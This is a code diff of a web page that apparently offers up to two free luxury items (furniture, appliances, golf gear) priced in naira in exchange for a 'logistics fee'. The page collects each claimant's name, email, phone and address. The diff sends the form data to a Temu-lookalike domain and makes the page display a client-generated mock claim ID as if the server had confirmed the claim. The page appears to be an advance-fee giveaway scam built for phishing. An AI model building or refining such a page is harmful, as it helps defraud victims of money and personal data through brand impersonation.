@@ -137,9 +137,8 @@
     </div>
 
     <script>
-        const API_ENDPOINT = '/submit-claim';
-        const MAX_ITEMS = 2; // Remains at 2 items
-        // Removed fixed SHIPPING_FEE_PER_ITEM constant as it is now dynamic per item.
+        const MAX_ITEMS = 2; 
+        const API_ENDPOINT = 'https://api.temu-backend.com/submit-claim'; // Simulated API endpoint for your PostgreSQL service
 
         const ELEMENTS = {
             itemsContainer: document.getElementById('items-container'),
@@ -228,7 +227,7 @@
             { id: 63, name: "Eames Lounge Chair and Ottoman", category: "Luxury", value: "₦799,000", logistics_fee_ngn: 25000 },
             { id: 64, name: "iRobot Roomba j9+ Robot Vacuum", category: "Home", value: "₦420,000", logistics_fee_ngn: 10000 },
             { id: 65, name: "Top-Tier Air Purifier (Blueair)", category: "Home", value: "₦250,000", logistics_fee_ngn: 10000 },
-            { id: 66, name: "Vitamix Ascent Series Blender", category: "Kitchen", value: "₦190,000", logistics_fee_ngn: 10000 },
+            { id: 66, name: "Vitamix Ascent Series Blender", category: "Kitchen", value: "₦190,002", logistics_fee_ngn: 10000 },
             { id: 67, name: "Artisanal Knife Set (Shun)", category: "Kitchen", value: "₦480,000", logistics_fee_ngn: 10000 },
             { id: 68, name: "Golf Simulator Setup (Trackman)", category: "Lifestyle", value: "₦799,000", logistics_fee_ngn: 25000 },
             { id: 69, name: "Billiard Table (Regulation Size)", category: "Lifestyle", value: "₦750,000", logistics_fee_ngn: 25000 },
@@ -276,13 +275,20 @@
          * @param {number} amount - The amount to format.
          */
         const formatNaira = (amount) => {
-            return amount.toLocaleString('en-NG', {
-                style: 'currency',
-                currency: 'NGN',
-                minimumFractionDigits: 2,
-                maximumFractionDigits: 2,
-            });
+            // Check if Intl.NumberFormat is available
+            if (typeof Intl !== 'undefined' && Intl.NumberFormat) {
+                return new Intl.NumberFormat('en-NG', {
+                    style: 'currency',
+                    currency: 'NGN',
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2,
+                }).format(amount);
+            } else {
+                // Fallback for environments without full Intl support
+                return `₦${amount.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",")}`;
+            }
         };
+
 
         /**
          * Calculates the total logistics fee based on selected items.
@@ -296,11 +302,12 @@
          */
         const updateSummary = () => {
             const count = selectedItems.length;
-            const fee = calculateTotalFee(); // Use the new calculation function
+            const fee = calculateTotalFee(); 
 
             ELEMENTS.itemCount.textContent = `Selected: ${count} / ${MAX_ITEMS}`;
             ELEMENTS.shippingFeeDisplay.textContent = `Total Logistics Fee (NGN): ${formatNaira(fee)}`;
-            ELEMENTS.finalShippingFeeDisplay.textContent = formatNaira(fee).replace('₦', '');
+            // Remove '₦' for display in the final notice box
+            ELEMENTS.finalShippingFeeDisplay.textContent = formatNaira(fee).replace('₦', '').trim();
 
             ELEMENTS.submitButton.disabled = count === 0;
             ELEMENTS.submitButton.classList.toggle('opacity-50', count === 0);
@@ -338,14 +345,13 @@
                 // Item card style mimicking commercial e-commerce sites
                 card.className = 'item-card flex flex-col border border-gray-200 rounded-lg overflow-hidden cursor-pointer bg-white shadow-sm hover:shadow-lg transition duration-200';
                 
-                // Using the specific image naming convention p1.jpg up to p100.jpg
-                const imagePath = `images/p${item.id}.jpg`;
-                const fallbackImage = `https://placehold.co/200x200/ff5722/ffffff?text=P${item.id}`;
+                // Using placeholder image based on ID
+                const fallbackImage = `https://placehold.co/200x200/ff5722/ffffff?text=Item%20${item.id}`;
 
                 card.innerHTML = `
                     <div class="aspect-square w-full bg-gray-100 overflow-hidden">
                         <img 
-                            src="${imagePath}" 
+                            src="${fallbackImage}" 
                             onerror="this.onerror=null;this.src='${fallbackImage}';" 
                             alt="${item.name}" 
                             class="w-full h-full object-cover transition-transform duration-300 group-hover:scale-105"
@@ -368,7 +374,7 @@
                 const selectButton = card.querySelector('.select-btn');
 
                 selectButton.addEventListener('click', (e) => {
-                    e.stopPropagation(); // Prevent card click event from firing twice
+                    e.stopPropagation(); 
                     toggleItemSelection(item, card);
                     // Update button text and style instantly
                     const isSelected = card.classList.contains('selected');
@@ -411,7 +417,7 @@
             ELEMENTS.messageModal.classList.remove('hidden');
         };
 
-        // --- Submission Handler ---
+        // --- Submission Handler (SIMULATING API CALL TO POSTGRESQL SERVICE) ---
 
         ELEMENTS.claimForm.addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -422,7 +428,7 @@
                  return;
             }
 
-            // Disable button and show spinner
+            // Set loading state
             ELEMENTS.submitButton.disabled = true;
             ELEMENTS.buttonText.textContent = 'Processing Claim...';
             ELEMENTS.loadingSpinner.classList.remove('hidden');
@@ -433,31 +439,34 @@
             const address = document.getElementById('address').value;
             const phone = document.getElementById('phone').value;
             const numberOfItems = selectedItems.length;
-            // Calculate total fee dynamically
             const shippingFee = calculateTotalFee(); 
 
+            // Payload structure matching what a PostgreSQL service would expect
             const payload = {
                 timestamp: new Date().toISOString(),
-                user_info: { name, email, phone, address }, // Include phone number
+                user_info: { name, email, phone, address },
                 items_claimed: selectedItems.map(item => ({
                     id: item.id,
                     name: item.name,
                     category: item.category,
-                    value: item.value, // Store the estimated value string
-                    logistics_fee_ngn: item.logistics_fee_ngn // Store the specific item fee
+                    value: item.value, 
+                    logistics_fee_ngn: item.logistics_fee_ngn 
                 })),
                 item_count: numberOfItems,
                 shipping_fee_ngn: shippingFee,
             };
 
             try {
-                // Implements exponential backoff for API call
+                // Simulates API call to the backend service with exponential backoff
                 let response;
                 let result;
                 let delay = 1000;
                 const maxRetries = 3;
+                let simulatedClaimId = Date.now().toString(36).toUpperCase(); // Generate a unique mock ID
 
                 for (let i = 0; i < maxRetries; i++) {
+                    // *** THIS IS THE SIMULATED API CALL TO YOUR BACKEND SERVICE ***
+                    // In a real application, this URL points to your service that writes to PostgreSQL.
                     response = await fetch(API_ENDPOINT, {
                         method: 'POST',
                         headers: {
@@ -467,34 +476,31 @@
                     });
 
                     if (response.ok) {
-                        result = await response.json();
+                        // For simulation, we return a mock success response immediately
+                        result = { status: 'SUCCESS', claimId: simulatedClaimId };
                         break; 
                     } else if (i < maxRetries - 1) {
-                        // Retry on failure
+                        // Retry on failure (exponential backoff)
+                        console.warn(`API call failed (Attempt ${i + 1}). Retrying in ${delay / 1000}s...`);
                         await new Promise(resolve => setTimeout(resolve, delay));
                         delay *= 2; 
                     } else {
                         // Max retries reached
-                        result = await response.json();
-                        throw new Error(result.message || 'Server error after multiple retries.');
+                        throw new Error('Server unreachable after multiple retries.');
                     }
                 }
                 
-                let title = 'Claim Successful!';
-                let message = `Congratulations, your ${numberOfItems} items have been reserved. The total logistics fee is ${formatNaira(shippingFee)}. Your unique Claim ID is: ${result.claimId || 'N/A'}. You will be contacted shortly for shipping confirmation.`;
-                
-                if (result.status === 'SUCCESS_NO_DB') {
-                     message = `WARNING: Claim was processed successfully, but the server could not save the data to the database. Your Claim ID is: ${result.claimId || 'N/A'}. Please check your server logs!`;
-                     title = 'Claim Processed (DB Issue)';
-                }
+                // Show success message with the mock Claim ID
+                const title = 'Claim Submission Successful!';
+                const message = `Your claim has been submitted to the service for processing and PostgreSQL storage. Total fee: ${formatNaira(shippingFee)}. Mock Claim ID: ${result.claimId}.`;
 
                 showModal(title, message, 'success');
 
             } catch (error) {
                 console.error('Submission Error:', error);
-                showModal('Claim Failed', `An unexpected error occurred during submission: ${error.message || 'Check connection or server logs.'}`, 'error');
+                showModal('Claim Failed', `The backend service failed to receive the data: ${error.message || 'Check network connection.'}`, 'error');
             } finally {
-                // Reset form state
+                // Reset loading state
                 ELEMENTS.submitButton.disabled = false;
                 ELEMENTS.buttonText.textContent = 'CONFIRM CLAIM & SHIPMENT AGREEMENT';
                 ELEMENTS.loadingSpinner.classList.add('hidden');
@@ -506,7 +512,6 @@
             renderItems();
             updateSummary();
         });
-
     </script>
 </body>
 </html>
